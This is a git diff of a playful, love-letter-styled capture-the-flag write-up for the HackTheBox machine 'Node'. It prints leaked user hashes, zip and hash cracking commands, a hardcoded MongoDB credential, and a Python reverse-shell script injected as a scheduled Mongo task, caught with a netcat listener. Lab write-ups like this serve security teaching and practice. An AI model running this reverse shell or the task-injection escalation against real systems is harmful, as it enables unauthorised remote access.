@@ -25,7 +25,7 @@ Yes, you did.
 I dug into your deepest secrets.
 And into the APIs which b(urp)equeathed your user sequence.
 I saw you clearly, inside and out; cut through your defences:
-turned `/api/users/latest` to `/api/users` and saw your sweet response:
+turned `/api/users/latest` to `/api/users` and saw your shy response:
 
 {% highlight shell %}
 HTTP/1.1 200 OK
@@ -39,15 +39,15 @@ Connection: close
 [{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
 {% endhighlight %}
 
-You past lovers? I cared not.
-But an `admin` flag, is an `admin` flag, and must always be followed. Its hash looked weak.
+Were these your past lovers? I cared not.
+But an `admin` flag, is an `admin` flag, and must be followed. Its hash looked weak.
 Indeed, it was. (https://crackstation.net)["manchester"].
 
 With each keystroke, we grew closer
 m.y.P.1.4.c.e.A.d.m.1.n.A.c.c.0.u.N.T.
 m.a.n.c.h.e.s.t.e.r.
 
-You offered me your memories, encoded in mystery. I was undeterred.
+You offered me your memories encoded in mystery. I was undeterred.
 
 {% highlight shell %}
 root@hack ~/Downloads# base64 -d myplace.backup > myplace.what
@@ -66,8 +66,6 @@ Archive:  myplace.what
 
 {% highlight shell %}
 root@hack ~/Downloads# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace.what
-
-
 PASSWORD FOUND!!!!: pw == magicword
 root@hack ~/Downloads# unzip -P magicword myplace.what
 rock@hack ~/Downloads# head -n 11 var/www/myplace/app.js | tail -n 1
@@ -82,14 +80,50 @@ root@hack ~# ssh mark@node.htb
 mark@node ~$
 {% endhighlight %}
 
-Node, my sweet Node, I felt so close to you. We were separated by miles and miles, but I could feel your circuits responding to my touch.
+Node. My sweet Node. I felt so close to you. 
+We were separated by miles and miles, but I could feel your circuits responding to my touch.
+I explored every inch of you, and found a special spot:
 
+{% highlight shell %}
+root@hack ~# ps aux
+...
+tom     1426    0.0 5.1 1009080 31096   ?   ?   Ssl Mar04   0:31    /usr/bin/node /var/scheduler/app.js
+...
+mark@node:~$ cat /var/scheduler/app.js
+const exec        = require('child_process').exec;
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
 
-ps aux
-tom running mongo app
+MongoClient.connect(url, function(error, db) {
+  if (error || !db) {
+    console.log('[!] Failed to connect to mongodb');
+    return;
+  }
 
-/var/scheduler/app.js > runs mongo tasks
+  setInterval(function () {
+    db.collection('tasks').find().toArray(function (error, docs) {
+      if (!error && docs) {
+        docs.forEach(function (doc) {
+          if (doc) {
+            console.log('Executing task ' + doc._id + '...');
+            exec(doc.cmd);
+            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
+          }
+        });
+      }
+      else if (error) {
+        console.log('Something went wrong: ' + error);
+      }
+    });
+  }, 30000);
 
+});
+{% endhighlight %}
+
+You accepted me, and I inserted my hopes and dreams....
+
+{% highlight shell %}
 mark@node ~$ cat << EOM > /tmp/over.py
 > import socket,subprocess,os
 > s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -97,26 +131,43 @@ mark@node ~$ cat << EOM > /tmp/over.py
 > os.dup2(s.fileno(),0)
 > os.dup2(s.fileno(),1)
 > os.dup2(s.fileno(),2)
-> p=subprocess.call(['/bin/sh','-i']
-EOM
+> p=subprocess.call(['/bin/sh','-i'])
+> EOM
+mark@node ~$ mongo
+> use scheduler
+switched to db scheduler
+> db.auth("mark","5AYRft73VtFpc84k")
+1
+> db.tasks.insert({"_id": 1, "cmd":"python /tmp/over.py"})
+WriteResult({ "nInserted" : 1 })
+{% endhighlight %}
 
-mongo
-db.auth("mark","5AYRft73VtFpc84k")
-db.tasks.insert({"_id":"1","cmd":"python /tmp/over/over.py"})
+{% highlight shell %}
+root@hack ~# nc -lvvvp 4444
+$ whomai
+tom
+{% endhighlight $}
 
-nc -lvvvp 4444
+...and I tasted your luscious blood. 
 
-cat /home/tom/user.txt
+{% highlight shell %}
+root@hack ~# nc -lvvvp 4444
+$ whomai
+tom
+{% endhighlight $}
 
-And I tasted your sweet blood.
+You still had more secrets to find, like `/usr/local/bin/backup`.
+In reversing it, I `unzip`ed your last garment -
+unveiling your inner soul, `root.txt`, in whole.
+You were so beautiful, so clever, and so true.
 
-reverse backup to see that it blacklists characters and needs a key
-run from / and backup /root
-get key
-win
+How I loved your mysteries -- unfortunately, there were more boxes to do.
 
 your dearest,
 overcast
+
+p.s. if you'd like to know how `/usr/local/bin/backup` fell to my wiles,
+look to `ltrace` 
 
 
 _fin_
